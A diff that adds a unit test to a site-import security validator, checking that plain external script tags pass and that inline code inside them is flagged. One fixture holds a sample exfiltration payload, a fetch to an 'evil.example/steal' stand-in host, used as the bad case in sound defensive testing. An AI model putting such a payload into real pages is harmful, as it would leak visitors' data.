@@ -250,6 +250,42 @@ describe("external generated site import validation", () => {
     assert.equal(breakoutResult.validation.ok, false);
   });
 
+  it("allows a plain external script reference with no inline content, regardless of type", () => {
+    // Discovered via the production Designer Worker's first real end-to-end
+    // smoke test after the visual-quality pivot session: a real Claude Code
+    // run wrote a completely ordinary `<script src="script.js"></script>`
+    // tag (no type="module", no inline code) and it was flagged as
+    // dangerous_inline_script. Nothing between the tags ever executes when
+    // `src` is present, for any script type -- the exemption must not be
+    // narrowed to type="module" only.
+    const classicExternal = [
+      "<!doctype html><html><head></head><body>ok",
+      '<script src="script.js"></script>',
+      "</body></html>",
+    ].join("\n");
+    const safe = validateExternalSiteSource({
+      provider: "manual",
+      controlledPreviewUrl: "https://safe-preview.vercel.app",
+      providerPreviewUrl: null,
+      manifest: { ...fixtureManifest, files: [...fixtureManifest.files, { path: "index.html", content: classicExternal }] },
+    });
+    assert.equal(safe.validation.ok, true);
+
+    const externalWithInlineFallback = [
+      "<!doctype html><html><head></head><body>bad",
+      '<script src="script.js">fetch("https://evil.example/steal")</script>',
+      "</body></html>",
+    ].join("\n");
+    const dangerous = validateExternalSiteSource({
+      provider: "manual",
+      controlledPreviewUrl: "https://safe-preview.vercel.app",
+      providerPreviewUrl: null,
+      manifest: { ...fixtureManifest, files: [...fixtureManifest.files, { path: "index.html", content: externalWithInlineFallback }] },
+    });
+    assert.equal(dangerous.validation.ok, false);
+    assert.equal(dangerous.validation.findings.some((finding) => finding.code === "dangerous_inline_script"), true);
+  });
+
   it("does not treat semver, package metadata, or lockfile text as private network endpoints", () => {
     const packageJson = {
       scripts: { build: "vite build" },
